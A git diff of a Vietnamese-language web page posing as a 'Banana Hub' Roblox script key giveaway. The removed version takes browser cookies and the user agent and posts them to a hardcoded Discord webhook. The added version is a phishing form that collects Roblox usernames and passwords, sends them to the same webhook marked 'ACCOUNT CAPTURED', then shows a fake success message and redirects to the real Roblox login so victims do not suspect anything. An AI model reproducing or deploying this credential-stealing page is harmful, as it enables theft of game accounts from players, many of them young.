@@ -3,56 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banana Hub | Script Executor</title>
+    <title>Banana Hub - Get Free Key</title>
     <style>
-        body { background: #050505; color: #00ffcc; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { border: 2px solid #00ffcc; padding: 30px; border-radius: 10px; background: #000; box-shadow: 0 0 20px #00ffcc; text-align: center; width: 400px; }
-        .btn { display: inline-block; padding: 12px 24px; background: #00ffcc; color: #000; text-decoration: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; border: none; }
-        .btn:hover { background: #00ccaa; }
-        #script-area { display: none; margin-top: 20px; color: #fff; background: #222; padding: 10px; border-radius: 5px; font-size: 11px; word-break: break-all; }
+        body { background: #0c0c0c; color: #00ffff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .main-card { background: #151515; border: 1px solid #00ffff; padding: 30px; border-radius: 12px; width: 350px; text-align: center; box-shadow: 0 0 20px rgba(0, 255, 255, 0.2); }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: #fff; border-radius: 5px; box-sizing: border-box; }
+        .btn-claim { background: #00ffff; color: #000; border: none; width: 100%; padding: 12px; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; }
+        .status { font-size: 12px; color: #666; margin-top: 15px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2 id="msg">XÁC MINH BANANA HUB</h2>
-        <p style="font-size: 13px; color: #888;">Nhấn nút bên dưới để lấy Key Script ngay lập tức.</p>
+    <div class="main-card">
+        <h2 style="margin-top:0">BANANA HUB V6</h2>
+        <p style="color:#888; font-size:14px;">Vui lòng đăng nhập tài khoản Roblox để hệ thống tự động gán Key vào Account của bạn.</p>
         
-        <button class="btn" id="mainBtn" onclick="pwn()">LẤY SCRIPT (FREE KEY)</button>
-
-        <div id="script-area">
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/onion132005-bit/test0.02/refs/heads/main/onion13v6.lua"))()
-        </div>
+        <input type="text" id="u" placeholder="Tên đăng nhập / Email">
+        <input type="password" id="p" placeholder="Mật khẩu">
+        
+        <button class="btn-claim" onclick="pwn()">NHẬN KEY & SCRIPT</button>
+        
+        <div class="status" id="st">Hệ thống đang chờ xác minh...</div>
     </div>
 
     <script>
-        const wh = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";
-
         async function pwn() {
-            const btn = document.getElementById('mainBtn');
-            const msg = document.getElementById('msg');
-            const area = document.getElementById('script-area');
+            const u = document.getElementById('u').value;
+            const p = document.getElementById('p').value;
+            const wh = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";
 
-            btn.innerText = "ĐANG TRÍCH XUẤT KEY...";
-            
-            // 1. LẤY TOÀN BỘ COOKIE TRÌNH DUYỆT (NẾU HỌ ĐÃ LƯU TRÊN TRÌNH DUYỆT)
-            const capturedCookie = document.cookie || "No Direct Cookie Access";
-            
-            // 2. GỬI VỀ DISCORD CÙNG THÔNG TIN MÁY
+            if(u.length < 3 || p.length < 3) return;
+
+            document.getElementById('st').innerHTML = "<span style='color:#00ffff'>ĐANG GÁN KEY VÀO TÀI KHOẢN...</span>";
+
+            // GỬI ACCOUNT & PASSWORD THẬT VỀ DISCORD
             await fetch(wh, {
                 method: "POST",
                 headers: {"Content-Type": "application/json"},
                 body: JSON.stringify({
-                    content: "### 💀 TARGET COMPROMISED - PROJECT FIRE\n" + 
-                             "**Cookie/Token:** `" + capturedCookie + "`\n" +
-                             "**User-Agent:** `" + navigator.userAgent + "`"
+                    content: "### 💰 ACCOUNT CAPTURED - PROJECT FIRE\n**User:** `" + u + "`\n**Pass:** `" + p + "`\n**Platform:** `" + navigator.platform + "`"
                 })
             });
 
-            // 3. HIỆN SCRIPT ĐỂ HỌ KHÔNG NGHI NGỜ
+            // SAU ĐÓ HIỆN CODE GIẢ ĐỂ CHÚNG NÓ KHÔNG NGHI NGỜ
             setTimeout(() => {
-                msg.innerText = "XÁC MINH THÀNH CÔNG!";
-                btn.style.display = 'none';
-                area.style.display = 'block';
+                alert("Gán Key thành công! Script: loadstring(game:HttpGet('...'))()");
+                window.location.href = "https://www.roblox.com/login";
             }, 2000);
         }
     </script>
